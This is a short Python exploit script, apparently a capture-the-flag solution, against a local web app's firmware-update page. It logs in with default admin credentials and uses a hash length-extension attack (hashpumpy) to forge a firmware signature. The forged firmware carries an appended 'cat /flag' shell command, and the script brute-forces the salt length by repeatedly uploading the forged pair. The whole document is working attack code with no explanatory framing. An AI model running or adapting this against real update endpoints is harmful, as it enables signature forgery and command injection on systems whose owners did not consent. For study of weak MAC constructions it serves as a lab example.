#!/usr/bin/python3

import sys
import requests
from hashpumpy import hashpump
from time import sleep

def forge_stuff(salt_length):
    with open("firmware.bin", "r") as fh:
        original_data = fh.read()

    with open("firmware.sig", "r") as fh:
        original_sig = fh.read()

    data_to_add = "\ncat /flag"

    result = hashpump(original_sig,
                      original_data, 
                      data_to_add, 
                      salt_length)

    with open("payload.sig", "w") as fh:
        fh.write(result[0])

    with open("payload.bin", "wb") as fh:
        fh.write(result[1])


login={"username":"admin", "password":"admin", "submit":""}
s = requests.Session() 
r = s.post("http://localhost:58888/login.php", data=login)
i=0

while "Bad" in r.text:
    forge_stuff(i)
    with open("payload.sig", "rb") as signature:
        with open("payload.bin", "rb") as payload:
            files={ "sig": signature, "bin" : payload}
            r=s.post("http://localhost:58888/update.php", data={"submit":""}, files=files)
            sleep(0.1)
    i+=1

print(r.text)
print("\n\n\nSalt length: %s" % str(i-1))
